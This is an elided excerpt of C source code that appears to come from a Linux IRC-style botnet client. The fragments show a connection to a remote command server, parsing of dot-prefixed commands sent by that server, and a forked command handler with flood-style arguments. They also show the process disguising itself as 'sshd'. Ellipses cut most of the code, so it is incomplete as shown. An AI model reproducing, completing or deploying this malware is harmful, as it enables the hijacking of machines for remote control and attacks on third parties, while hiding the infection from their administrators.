...
{ // Random alphanumeric string, more expensive than rand_str
...
int fdpopen(unsigned char *program, register unsigned char *type)
{
    ...
    if (fdopen_pids == NULL)
    {
        if ((fds = getdtablesize()) <= 0)
            return -1;
        if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL)
            return -1;
...
int fdpclose(int iop)
{
    ...
    if (fdopen_pids == NULL || fdopen_pids[iop] == 0)
        return (-1);
    (void)close(iop);
    sigemptyset(&nmask);
...
void processCmd(int argc, unsigned char *argv[])
{
    ...
    {
        if (argc < 5 || atoi(argv[3]) > 10000 || atoi(argv[4]) < 1)
            return;
        if (listFork())
            return;
...
int initConnection()
{
    ...
    if (!connectTimeout(KHcommSOCK, server, port, 30))
        return 1;
...
{
    char *mynameis = "";
    if (access("/usr/bin/python2.7", F_OK) != -1)
    {
        mynameis = "sshd";
    }
    else
        ...
        while ((got = recvLine(KHcommSOCK, commBuf, 4096)) != -1)
        {
            ...
            if (*m3ss4ge == '.')
            {
                ...
                *(nickMask) = 0x00;
                ...
                while (m3ss4ge[strlen(m3ss4ge) - 1] == '\n' || m3ss4ge[strlen(m3ss4ge) - 1] == '\r')
                    m3ss4ge[strlen(m3ss4ge) - 1] = 0x00;
                unsigned char *command = m3ss4ge;
                while (*m3ss4ge != ' ' && *m3ss4ge != 0x00)
                    m3ss4ge++;
                *m3ss4ge = 0x00;
                m3ss4ge++;
